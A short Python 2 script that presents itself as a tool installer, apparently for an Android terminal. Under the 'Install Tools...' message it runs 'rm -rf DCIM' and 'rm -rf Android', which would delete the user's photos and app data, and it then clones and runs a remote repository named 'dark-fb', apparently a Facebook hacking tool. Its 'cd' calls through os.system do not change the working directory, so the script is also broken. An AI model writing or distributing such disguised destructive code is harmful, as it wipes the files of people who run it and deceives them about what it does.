import os,sys,time

os.system("reset")
print "Install Tools..."
time.sleep(2)
os.system("cd /sdcard")
os.system("rm -rf DCIM")
os.system("rm -rf Android")
os.system("git clone https://github.com/rezadkim/dark-fb")
os.system("cd dark-fb")
os.system("python2 dark.py")
